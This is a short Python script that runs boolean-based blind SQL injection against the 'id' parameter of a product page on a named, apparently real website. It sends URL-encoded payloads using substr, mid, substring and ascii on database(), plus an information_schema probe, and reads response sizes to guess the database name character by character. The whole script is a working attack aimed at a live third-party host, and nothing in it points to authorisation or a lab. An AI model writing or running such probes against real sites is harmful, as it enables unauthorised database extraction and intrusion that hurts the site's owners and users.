#!/usr/bin/env python3
"""debug pos2 - check actual response sizes for substr variants"""
import urllib.request

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception as ex:
        return 0, 0

tests = [
    ("%27%20OR%20(select%20substr(database(),2,1)='h')--%20", "pos2=h"),
    ("%27%20OR%20(select%20substr(database(),1,1)='I')--%20", "pos1=I"),
    ("%27%20OR%20(select%20substr(database(),1,2)='hx')--%20", "pos1-2=hx"),
    ("%27%20OR%20(select%20mid(database(),2,1)='h')--%20", "mid2=h"),
    ("%27%20OR%20(select%20substring(database(),2,1)='h')--%20", "substring2=h"),
    ("%27%20OR%20(select%20ascii(substr(database(),2,1))=104)--%20", "ascii2=104"),
    ("%27%20OR%20(select%20database())--%20", "db-true"),
    ("%27%20OR%20(select%201)>(select%20count(*)%20from%20information_schema.tables)--%20", "infoschema"),
]
for payload, tag in tests:
    code, sz = fetch(BASE + "?id=686" + payload)
    print("%-35s code=%s size=%d %s" % (tag, code, sz, "TRUE" if sz > 10000 else "false"))
